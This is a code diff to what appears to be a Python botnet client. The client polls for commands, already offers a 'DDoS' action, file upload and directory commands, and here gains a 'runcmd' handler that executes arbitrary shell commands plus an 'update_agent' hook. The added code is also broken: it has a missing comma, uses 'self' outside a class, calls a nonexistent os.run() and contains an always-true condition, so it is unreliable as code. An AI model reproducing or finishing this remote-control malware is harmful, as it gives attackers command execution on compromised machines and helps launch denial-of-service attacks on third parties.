@@ -21,8 +21,8 @@ def get_command():
 
 def parse_ret_val(ret_val):
     cmd = ret_val['command']
-    path = ret_val['path']
-    return (cmd, path)
+    extra = ret_val['extra']
+    return (cmd, extra)
 
 def get_script():
     while 1:
@@ -79,14 +79,29 @@ def upload_file(file_name):
             print (r.text)
         finally:
             fin.close()
+
+def runcmd(cmd):
+    """ Chạy một shell command và trả về output"""
+    try:
+        proc = subprocess.Popen(cmd, shell=True, stdin=subprocess.PIPE, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
+        out, err = proc.communicate()
+        result = (out + err)
+        self.send_result()
+    except Exception as exc:
+        result = traceback.format_exc()
+        self.send_result()
+
 steps = {
     "DDoS": (get_script, launchDDoS),
     "Standby": (),
     "ls" : (ls, send_result),
     "cd" : (cd, send_result),
     "pwd" : (pwd, send_result),
-    "upload" : (upload_file, )
+    "upload" : (upload_file, ),
+    "update_agent" : (update_agent, )
+    "runcmd" (runcmd, )
 }
+
 
 def run():
     while True:
@@ -95,6 +110,8 @@ def run():
             command = parse_ret_val(command)
             if str(command[0]) not in steps:
                 continue
+            elif str(command[0]) == "update_agent":
+                os.run()
             else:
                 print("command is:", command[0])
                 print(command[1])
@@ -102,7 +119,7 @@ def run():
                 for step in steps[command[0]]:
                     args = inspect.getargspec(step)[0]
                     assert(isinstance(args, list))
-                    if 'path' in args or 'file_name' in args:
+                    if 'path' in args or 'file_name' or 'cmd' in args:
                         step(command[1])
                     # elif 'result' in args:
                     #     step()
